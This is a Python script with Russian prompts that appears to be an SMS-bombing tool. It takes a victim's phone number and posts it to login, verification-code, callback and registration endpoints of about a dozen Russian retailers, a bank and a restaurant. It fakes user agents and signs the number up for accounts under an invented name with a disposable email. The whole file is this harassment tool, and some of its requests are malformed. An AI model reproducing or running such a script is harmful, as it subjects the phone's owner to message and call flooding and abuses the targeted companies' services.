import requests, fake_useragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
number = input('Введите номер хатофона(без +)')


try:
    reponse = requests.post('https://new.moy.magnit.ru/local/ajax/login/', headers=headers, data={'phone' : number })
    print('Отправка прошла успешно')
except:
        print("что-то пошло не так")

try:
    reponse = requests.post('https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php', headers=headers,
                           json={'user_login': number})
    print('Отправка прошла успешно')
except:
        print("что-то пошло не так")

try:
    reponse = requests.post('https://krasnoyarsk.sushi-market.com/sendForm/callMeBack', headers=headers,
                           json={"name":"Роман","phone": number},)
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")

try:
    reponse = requests.post('https://my.modulbank.ru/api/v2/auth/phone', headers=headers,
                           json={"CellPhone": number},)
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")

try:
    reponse = requests.post('https://www.585zolotoy.ru/api/sms/send_code/', headers=headers,
                           json={"phone":number},)
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")

try:
    reponse = requests.post('https://api.sunlight.net/v3/customers/authorization/', headers=headers,
                           json={"phone": number},)
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")

try:
    reponse = requests.post('https://sokolov.ru/api/v4/profile/user/send-code/', headers=headers,
                           json={"data":{"type":"login","attributes":{"phone": number}}},)
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")


try:
    reponse = requests.post('https://www.585zolotoy.ru/api/sms/send_code/', headers=headers,
                           json={"phone": number },)
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")



try:
    reponse = requests.post('https://zoloto585.ru/api/bcard/reg2/', headers=headers,
                           json={"name":"Анна","surname":"Зотеева","patronymic":"Николаевна","sex":"f","birthdate":"24.07.1997","phone": number ,"email":"queulonniroubau-6576@yopmail.com","city":"Москва"})
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")


try:
    reponse = requests.post('https://www.valtera.ru/accounts/new/', headers=headers,
                           json={"name": "Зотеева","last_name": "Анна", "date_of_birth": "1982-02-11", "gender": "f", "city": "Новосибирск","email":"queulonniroubau-6576@yopmail.com","phone": number,"is_subscriber": "on"},)
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")



try:
    reponse = requests.post('https://lenta.com/api/v1/registration/requestUserStatus', headers=headers,
                           json={"phoneNumber": number},)
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")

try:
    reponse = requests.post('http://24yarmarka.ru/contact.php', headers=headers,
                           json={"nameFF=Роман&contactFF="+": number &emailFF=queulonniroubau-6576@yopmail.com"},)
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")























